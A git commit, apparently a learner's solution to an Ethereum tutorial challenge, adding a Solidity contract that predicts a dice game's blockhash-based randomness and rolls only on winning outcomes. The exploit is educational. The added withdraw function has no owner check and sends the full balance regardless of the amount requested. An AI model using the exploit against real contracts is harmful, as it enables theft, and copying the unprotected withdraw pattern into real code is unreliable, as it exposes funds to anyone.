5f3a36a8ab71c2da6588bba800436dbadeff545f
phenozd <danielnsolomon@gmail.com>
2022-12-07 22:09:34 -0500

    challenge 3

--- packages/hardhat/contracts/RiggedRoll.sol
+++ packages/hardhat/contracts/RiggedRoll.sol
@@ -8,17 +8,44 @@ import "@openzeppelin/contracts/access/Ownable.sol";
 contract RiggedRoll is Ownable {
 
     DiceGame public diceGame;
-
+	
     constructor(address payable diceGameAddress) {
         diceGame = DiceGame(diceGameAddress);
     }
 
     //Add withdraw function to transfer ether from the rigged contract to an address
+	
+	function withdraw(address _addr, uint256 _amount) public {
+		require(_amount <= address(this).balance, "Trying to withdraw more than contract has");
+		
+		(bool sent,) = _addr.call{value: address(this).balance}("");
+		require(sent, "Failed to send Ether");
+	}
 
 
     //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
+	
+	function riggedRoll() public {		
+		require(address(this).balance >= .002 ether, "not enough eth");
+		
+		bytes32 prevHash = blockhash(block.number - 1);
+        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
+        uint256 roll = uint256(hash) % 16;
+
+        console.log('\t',"   Dice Game Rigged Roll:",roll);
+		
+			
+		if (roll <= 2) {
+			diceGame.rollTheDice{value: 0.002 ether}();				
+		}
+		
+	}
 
 
     //Add receive() function so contract can receive Eth
+	
+	receive() external payable {
+		
+  }
     
 }
--- packages/hardhat/deploy/01_deploy_riggedRoll.js
+++ packages/hardhat/deploy/01_deploy_riggedRoll.js
@@ -9,13 +9,13 @@ module.exports = async ({ getNamedAccounts, deployments, getChainId }) => {
 
   const diceGame = await ethers.getContract("DiceGame", deployer);
 
-  /*
+  
   await deploy("RiggedRoll", {
    from: deployer,
    args: [diceGame.address],
    log: true,
   });
-  */
+  
 
   //const riggedRoll = await ethers.getContract("RiggedRoll", deployer);
 
